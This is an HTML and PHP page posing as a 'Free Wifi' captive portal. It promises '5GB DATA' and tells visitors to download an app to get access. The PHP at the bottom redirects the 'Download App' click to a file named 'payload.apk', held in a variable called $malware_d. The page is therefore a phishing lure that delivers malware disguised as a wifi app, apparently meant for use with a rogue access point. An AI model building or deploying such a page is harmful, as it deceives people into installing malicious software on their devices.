<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title> Free Wifi </title>
  
  <link rel="icon" type="image/png" href="logo.png"/>

<style>

body
{ 
	background: linear-gradient(#000000, #00000f) fixed;
}

img
{
filter: invert(100%) sepia(93%) saturate(207%) hue-rotate(130deg) brightness(99%) contrast(90%);
}

a
{
background: #F14C4C;	
border-style: solid;
border-width : 2px 2px 2px 2px;
text-decoration : none;
padding : 15px;
border-color : #F14C4C;
color: white;
}


a:hover 
{
background: #F02C2C;	
border-style: solid;
border-width : 2px 2px 2px 2px;
text-decoration : none;
padding : 15px;
border-color : #F02C2C;
color: white;
}


</style>


</head>

<body>



    <div align="center">

	 <img src="logo.png" alt="" height="35%" width="35%">
		 
			
      <font color="white"> 
		 
        <h1> Welcome! </h1>
        <h4> GET 5GB DATA </h4>
        <h3> <i> Download the app for access the wifi. </i> </h3>
      
      </font>
      
       <br> <br>
         
        <a href="?download=ok" name="download_app"> Download App </a>       
          
    </div>

 

</body>

</html>


<?php

     if ($_SERVER['QUERY_STRING'] == 'download=ok')
        {
      
      define;
$malware_d="payload.apk";
            
   	  header("Location: $malware_d");
}
?>
